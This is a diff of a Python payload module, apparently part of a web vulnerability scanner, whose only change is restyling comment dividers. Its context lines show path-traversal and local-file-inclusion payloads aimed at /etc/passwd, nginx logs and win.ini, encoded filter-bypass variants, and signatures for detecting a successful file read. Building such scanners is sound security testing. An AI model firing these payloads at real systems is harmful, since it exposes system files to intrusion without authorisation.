@@ -1,6 +1,6 @@
 """Path traversal / LFI / RFI payloads."""
 
-# -- Tier 1: Direct traversals -------------------------------------------------
+# ── Tier 1: Direct traversals ─────────────────────────────────────────────────
 LFI_T1 = [
     "../../../etc/passwd",
     "../../etc/passwd",
@@ -16,7 +16,7 @@ LFI_T1 = [
     "/var/log/nginx/access.log",
 ]
 
-# -- Tier 2: Encoding bypass variants ------------------------------------------
+# ── Tier 2: Encoding bypass variants ──────────────────────────────────────────
 LFI_T2 = [
     # Double dot variations
     "....//....//....//etc/passwd",
@@ -37,7 +37,7 @@ LFI_T2 = [
     "%2Fetc%2Fpasswd",
 ]
 
-# -- Windows paths --------------------------------------------------------------
+# ── Windows paths ──────────────────────────────────────────────────────────────
 LFI_WINDOWS = [
     "..\\..\\..\\windows\\win.ini",
     "..\\..\\..\\..\\.\\windows\\win.ini",
@@ -47,7 +47,7 @@ LFI_WINDOWS = [
     "/c:/windows/win.ini",
 ]
 
-# -- Success signatures ---------------------------------------------------------
+# ── Success signatures ─────────────────────────────────────────────────────────
 LFI_SUCCESS_SIGS = [
     r"root:x:0:0",
     r"bin:x:\d+:\d+",
